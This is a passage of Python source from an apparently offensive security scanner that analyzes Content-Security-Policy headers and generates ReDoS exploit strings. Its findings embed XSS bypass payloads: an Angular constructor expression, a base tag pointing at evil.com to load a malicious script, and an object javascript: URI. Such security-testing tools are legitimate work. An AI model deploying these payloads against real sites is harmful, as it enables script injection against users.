            result["details"]["successful_bypasses"].append("angular_expression")
            result["findings"].append({
                "type": "csp_bypass_angular",
                "severity": "High",
                "description": f"CDN hosts Angular.js: {cdn_hosts}. Angular expressions can bypass CSP.",
                "payload": '{{constructor.constructor("return alert(1)")()}}',
            })

        # Test 6: Base tag injection
        if 'base-uri' not in directives:
            result["details"]["tests_run"].append("base_tag")
            result["details"]["successful_bypasses"].append("base_tag_injection")
            result["findings"].append({
                "type": "csp_bypass_base_tag",
                "severity": "Medium",
                "description": "No base-uri restriction - base tag injection can redirect relative script paths",
                "payload": '<base href="https://evil.com/"><script src="/malicious.js"></script>',
            })

        # Test 7: Object tag bypass
        object_src = directives.get('object-src', directives.get('default-src', []))
        if "'none'" not in object_src and not object_src:
            result["details"]["tests_run"].append("object_tag")
            result["findings"].append({
                "type": "csp_bypass_object",
                "severity": "Medium",
                "description": "Missing object-src - Flash/PDF XSS may bypass CSP",
                "payload": '<object data="javascript:alert(1)">',
            })

        if result["vulnerable"]:
            self._print(f"  [!!!] CSP CAN BE BYPASSED FOR XSS!", RED)
        else:
            self._print(f"  [-] No CSP XSS bypasses found", GREEN)

        return result

    # ========================================================================
    # HELPER: CHECK INLINE SCRIPTS/STYLES
    # ========================================================================

    def _check_inline_scripts(self, url, directives):
        """Check for inline script/style detection under CSP"""
        result = {"findings": []}

        script_src = directives.get('script-src', directives.get('default-src', []))
        style_src = directives.get('style-src', directives.get('default-src', []))

        # If unsafe-inline is NOT present but inline scripts exist, they'll be blocked
        # If unsafe-inline IS present, CSP is weakened
        if "'unsafe-inline'" in script_src:
            result["findings"].append({
                "type": "inline_scripts_allowed",
                "severity": "High",
                "description": "'unsafe-inline' in script-src allows inline scripts, "
                              "weakening XSS protection significantly",
            })

        if "'unsafe-inline'" in style_src:
            result["findings"].append({
                "type": "inline_styles_allowed",
                "severity": "Medium",
                "description": "'unsafe-inline' in style-src allows inline styles, "
                              "enabling CSS-based data exfiltration",
            })

        return result

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for ReDoS + CSP Engine

        Args:
            target: Target URL or regex pattern
            scan_type: Type of scan to run
                - 'redos': ReDoS detection on a pattern
                - 'redos_exploit': Generate exploit strings for a pattern
                - 'csp': CSP analysis
                - 'csp_bypass': Find CSP bypasses
                - 'csp_xss': Test XSS through CSP
                - 'full': Full CSP + ReDoS scan
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  ReDoS + CSP ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: Regexploit + CSPBypass + CSPass{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        scan_map = {
            'redos': lambda: self.detect_redos(kwargs.get('pattern', target)),
            'redos_exploit': lambda: self.generate_exploit_string(kwargs.get('pattern', target)),
            'csp': lambda: self.analyze_csp(url),
            'csp_bypass': lambda: self.find_csp_bypass(url, kwargs.get('policy')),
            'csp_xss': lambda: self.test_csp_bypass_xss(url),
        }

        if scan_type == 'full':
            all_findings = []
            all_details = {}
            any_vulnerable = False

            tests = [
                ("CSP Analysis", lambda: self.analyze_csp(url)),
                ("CSP Bypass Finder", lambda: self.find_csp_bypass(url)),
                ("CSP XSS Bypass", lambda: self.test_csp_bypass_xss(url)),
            ]

            # Add ReDoS tests if a pattern is provided
            pattern = kwargs.get('pattern')
            if pattern:
                tests.insert(0, ("ReDoS Detection", lambda: self.detect_redos(pattern)))
                tests.insert(1, ("ReDoS Exploit Gen", lambda: self.generate_exploit_string(pattern)))

            for test_name, test_func in tests:
                self._print(f"\n  {BOLD}{YELLOW}[Phase] {test_name}{RESET}", YELLOW)
                try:
                    test_result = test_func()
                    if test_result.get('vulnerable'):
                        any_vulnerable = True
                    all_findings.extend(test_result.get('findings', []))
                    all_details[test_name] = test_result.get('details', {})
                except Exception as e:
                    all_details[test_name] = {"error": str(e)}

            return {
                'vulnerable': any_vulnerable,
                'findings': all_findings,
                'details': all_details,
                'scan_type': 'redos_csp_full',
            }

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {"error": f"Unknown scan type: {scan_type}"},
            'scan_type': scan_type,
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION (ZYLON FUSION INTEGRATION)
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = ReDoSCSPEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
